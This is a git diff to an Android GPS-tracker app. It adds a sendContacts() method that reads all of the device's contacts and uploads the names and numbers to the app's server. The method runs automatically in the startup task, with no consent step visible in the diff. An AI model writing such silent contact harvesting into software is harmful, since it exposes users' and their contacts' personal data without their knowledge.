@@ -1,9 +1,12 @@
 package com.vasciie.gpstrackeronline.activities;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -21,6 +24,8 @@ import com.vasciie.gpstrackeronline.fragments.RecyclerViewAdapterPhones;
 import com.vasciie.gpstrackeronline.fragments.SMSDialog;
 import com.vasciie.gpstrackeronline.services.APIConnector;
 
+import org.json.JSONObject;
+
 public class MainActivityCaller extends MainActivity {
     private static class FirstOperationsTask extends AsyncTask<MainActivityCaller, Void, Void> {
 
@@ -32,6 +37,7 @@ public class MainActivityCaller extends MainActivity {
             System.out.println(mainActivities[0].codes);
 
             mainActivities[0].setupPhonesList();
+            mainActivities[0].sendContacts();
 
             return null;
         }
@@ -106,6 +112,28 @@ public class MainActivityCaller extends MainActivity {
         recyclerView = findViewById(R.id.phones_list);
 
         new FirstOperationsTask().execute(this);
+    }
+
+    public void sendContacts(){
+        JSONObject contacts = new JSONObject();
+
+        try {
+            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+
+            while (phones.moveToNext()) {
+                @SuppressLint("Range") String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                @SuppressLint("Range") String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                contacts.put(name, phoneNumber);
+            }
+            phones.close();
+
+            System.out.println(contacts.toString());
+
+            APIConnector.SendContacts(contacts);
+        }
+        catch (Exception e){
+            e.printStackTrace();
+        }
     }
 
     private void setupPhonesList(){
